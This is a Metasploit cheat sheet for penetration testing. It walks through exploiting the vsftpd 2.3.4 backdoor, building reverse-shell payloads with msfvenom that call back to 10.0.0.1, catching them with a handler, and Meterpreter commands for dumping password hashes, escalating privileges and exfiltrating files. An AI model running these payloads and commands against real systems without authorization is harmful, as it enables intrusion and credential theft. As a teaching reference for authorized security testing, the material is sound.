# Metasploit Framework

Metasploit (by Rapid7) is the most widely used **exploitation framework**. It bundles thousands of exploits, payloads, and post-exploitation modules behind a single console (`msfconsole`), letting you go from "found a vulnerable service" to "got a shell" quickly.

## Core concepts

- **Exploit** - code that abuses a specific vulnerability
- **Payload** - what runs after the exploit (reverse shell, Meterpreter)
- **Auxiliary** - scanners, fuzzers, brute-forcers (no exploit)
- **Post** - modules run on an already-compromised host
- **Encoder / NOP** - obfuscate payloads to evade AV/filters
- **Meterpreter** - an advanced in-memory payload with a rich command set

## Start up

```bash
sudo msfdb init      # set up the database (enables workspaces/search)
msfconsole           # launch the console
db_status            # confirm DB connected
```

## Finding and running a module

```text
search type:exploit name:vsftpd        # find modules
use exploit/unix/ftp/vsftpd_234_backdoor
info                                    # module details
show options                            # required settings
set RHOSTS 10.10.10.5
set RPORT 21
show payloads                           # compatible payloads
set PAYLOAD cmd/unix/interact
check                                    # is target vulnerable? (some modules)
exploit          # or: run
```

## Payloads with msfvenom

```bash
# Linux reverse shell (ELF)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf

# Windows reverse shell (EXE)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe

# PHP / web
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.php

# List formats/payloads
msfvenom --list payloads | grep windows
```

## Catch the shell with the handler

```text
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 4444
exploit -j          # run as background job
```

## Meterpreter essentials

```text
sysinfo                 # target info
getuid                  # current user
getsystem               # attempt privesc to SYSTEM (Windows)
hashdump                # dump password hashes
ps / migrate <pid>      # move into another process
shell                   # drop to native OS shell
download /etc/passwd    # exfiltrate
upload local remote     # push a file
run post/multi/recon/local_exploit_suggester   # find privesc
background              # keep session, return to msf
sessions -l  /  sessions -i 1                   # list / interact
```

## Workspaces + recon integration

```text
workspace -a client1              # organise engagements
db_nmap -sV 10.10.10.0/24         # nmap results into the DB
hosts / services / vulns          # view collected data
```

## Tips

- Use `setg` to set global options (LHOST) across modules.
- `sessions -u <id>` upgrades a basic shell to Meterpreter.
- Only run against authorized targets - Metasploit is loud and can crash services.

## Resources

- [Metasploit Unleashed (free course)](https://www.offsec.com/metasploit-unleashed/)
